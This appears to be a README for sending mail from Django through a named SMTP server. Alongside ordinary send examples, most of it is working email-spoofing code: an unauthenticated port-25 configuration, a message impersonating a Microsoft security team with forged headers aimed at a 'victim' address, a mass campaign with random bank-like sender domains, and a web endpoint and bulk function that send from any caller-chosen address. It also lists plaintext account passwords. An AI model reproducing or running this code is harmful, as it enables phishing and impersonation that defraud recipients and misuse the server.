
# Django SMTP Integration - foiengine.com

## Server Details

```
Host: mail.foiengine.com
IP: 153.92.209.75
SMTP Port: 25
MSA Port: 587
SMTPS Port: 465
```

## Email Accounts

```
admin@foiengine.com : SecurePass123!
test@foiengine.com : TestPass123!
noreply@foiengine.com : NoReplyPass123!
```

## Django Settings

### Authenticated SMTP
```python
EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
EMAIL_HOST = 'mail.foiengine.com'
EMAIL_PORT = 587
EMAIL_USE_TLS = True
EMAIL_HOST_USER = 'admin@foiengine.com'
EMAIL_HOST_PASSWORD = 'SecurePass123!'
DEFAULT_FROM_EMAIL = 'noreply@foiengine.com'
```

### Unauthenticated SMTP (Spoofing)
```python
EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
EMAIL_HOST = 'mail.foiengine.com'
EMAIL_PORT = 25
EMAIL_USE_TLS = False
EMAIL_USE_SSL = False
EMAIL_HOST_USER = ''
EMAIL_HOST_PASSWORD = ''
DEFAULT_FROM_EMAIL = 'any@domain.com'
```

## Usage Examples

### Basic Email
```python
from django.core.mail import send_mail

send_mail(
    subject='Test Email',
    message='Test message content',
    from_email='test@foiengine.com',
    recipient_list=['recipient@example.com'],
    fail_silently=False,
)
```

### HTML Email
```python
from django.core.mail import EmailMultiAlternatives

subject = 'HTML Email'
from_email = 'noreply@foiengine.com'
to_email = ['recipient@example.com']
text_content = 'Plain text content'
html_content = '<h1>HTML Content</h1><p>This is HTML email.</p>'

msg = EmailMultiAlternatives(subject, text_content, from_email, to_email)
msg.attach_alternative(html_content, "text/html")
msg.send()
```

### Spoofed Email
```python
from django.core.mail import EmailMessage, get_connection

connection = get_connection(
    backend='django.core.mail.backends.smtp.EmailBackend',
    host='mail.foiengine.com',
    port=25,
    username='',
    password='',
    use_tls=False,
)

email = EmailMessage(
    subject='Spoofed Subject',
    body='Email content here',
    from_email='fake@anydomain.com',
    to=['target@example.com'],
    connection=connection,
)
email.send()
```

### Advanced Spoofing with Headers
```python
from django.core.mail import EmailMessage, get_connection

connection = get_connection(
    backend='django.core.mail.backends.smtp.EmailBackend',
    host='mail.foiengine.com',
    port=25,
    username='',
    password='',
    use_tls=False,
)

email = EmailMessage(
    subject='Important Security Alert',
    body='Email content',
    from_email='"Security Team" <security@microsoft.com>',
    to=['victim@company.com'],
    connection=connection,
)

email.extra_headers = {
    'Reply-To': 'support@different-domain.com',
    'Return-Path': 'bounces@other.com',
    'Organization': 'Microsoft Corporation',
    'X-Mailer': 'Microsoft Outlook',
}

email.send()
```

### Mass Email Campaign
```python
from django.core.mail import get_connection, EmailMessage
import random

fake_domains = ['bank.com', 'security.org', 'alerts.net']
recipients = ['user1@example.com', 'user2@example.com']

connection = get_connection(
    backend='django.core.mail.backends.smtp.EmailBackend',
    host='mail.foiengine.com',
    port=25,
    username='',
    password='',
    use_tls=False,
)

emails = []
for recipient in recipients:
    domain = random.choice(fake_domains)
    email = EmailMessage(
        subject=f'Alert from {domain}',
        body='Important message content',
        from_email=f'noreply@{domain}',
        to=[recipient],
        connection=connection,
    )
    emails.append(email)

connection.send_messages(emails)
```

## Django Views

### Email Sending View
```python
from django.http import JsonResponse
from django.core.mail import send_mail
import json

def send_email_view(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        
        send_mail(
            subject=data['subject'],
            message=data['message'],
            from_email=data['from_email'],
            recipient_list=[data['to_email']],
        )
        
        return JsonResponse({'status': 'sent'})
```

### Spoofing View
```python
from django.http import JsonResponse
from django.core.mail import get_connection, EmailMessage
import json

def spoof_email_view(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        
        connection = get_connection(
            backend='django.core.mail.backends.smtp.EmailBackend',
            host='mail.foiengine.com',
            port=25,
            username='',
            password='',
            use_tls=False,
        )
        
        email = EmailMessage(
            subject=data['subject'],
            body=data['message'],
            from_email=data['spoofed_from'],
            to=[data['to_email']],
            connection=connection,
        )
        email.send()
        
        return JsonResponse({'status': 'spoofed'})
```

## Connection Testing

```python
from django.core.mail import get_connection

def test_connection():
    connection = get_connection()
    try:
        connection.open()
        connection.close()
        return True
    except:
        return False
```

## Bulk Operations

```python
from django.core.mail import get_connection, EmailMessage

def send_bulk_spoofed(email_list):
    connection = get_connection(
        backend='django.core.mail.backends.smtp.EmailBackend',
        host='mail.foiengine.com',
        port=25,
        username='',
        password='',
        use_tls=False,
    )
    
    messages = []
    for item in email_list:
        msg = EmailMessage(
            subject=item['subject'],
            body=item['body'],
            from_email=item['from_email'],
            to=item['to_emails'],
            connection=connection,
        )
        messages.append(msg)
    
    connection.send_messages(messages)
```